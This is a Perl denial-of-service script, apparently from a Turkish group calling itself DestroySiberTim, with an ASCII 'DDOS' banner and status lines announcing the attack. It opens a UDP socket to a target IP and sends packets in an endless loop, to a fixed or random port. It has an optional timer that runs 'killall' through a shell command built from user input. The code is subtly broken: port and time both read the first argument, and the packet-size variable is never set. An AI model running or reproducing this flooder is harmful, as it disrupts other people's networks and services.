#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf " [1;35m# [1;33m# [1;31m* [0;32m  
    ██████╗ ██████╗  ██████╗ ███████╗    
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    
    ██║  ██║██║  ██║██║   ██║███████╗    
    ██║  ██║██║  ██║██║   ██║╚════██║    
    ██████╔╝██████╔╝╚██████╔╝███████║      
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝        
                   ...
                 ;::::;              
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
                                                                            
   [1;36m$ip n";

print "\n\033[1;m[\033[31m 1 ############## Paketler hazırlanılıyor \033[1;m]\n\033[1;31m ";
sleep 1;
print "\n\033[1;m[\033[31m 2 ############## Saldırı başlatılıyor sıkı tut kendini :) \033[1;m]\n\033[1;31m ";
sleep 1; 
print "\n\033[1;m[\033[31m 3 ############## DestroySiberTim iyi saldırılar diler \033[1;m]\n\033[1;31m ";
sleep 1; 
print '



+----------------------------------------------------------------------------------+
 DestroyNetWork.teamspeak3.pro Coder By -- ҳєɲɪʌ@ҳʌɪ̇ɲ
+----------------------------------------------------------------------------------+


';
print "\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}